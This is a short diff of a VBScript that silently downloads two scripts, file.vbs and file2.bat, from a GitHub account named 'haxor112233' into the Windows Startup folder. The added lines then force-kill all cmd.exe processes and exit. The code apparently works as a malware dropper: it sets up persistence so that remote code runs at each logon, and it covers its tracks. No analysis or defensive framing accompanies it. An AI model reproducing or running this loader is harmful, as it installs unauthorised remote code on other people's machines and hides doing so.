@@ -20,3 +20,7 @@ objShell.Run "cmd /c curl -s -o """ & startupFolder & "file.vbs"" ""https://raw.
 
 ' Download file2.bat to Startup folder
 objShell.Run "cmd /c curl -s -o """ & startupFolder & "file2.bat"" ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/file2.bat""", 0, True
+
+' Kill CMD process and exit the script
+objShell.Run "cmd /c taskkill /F /IM cmd.exe & exit", 0, True
+WScript.Quit
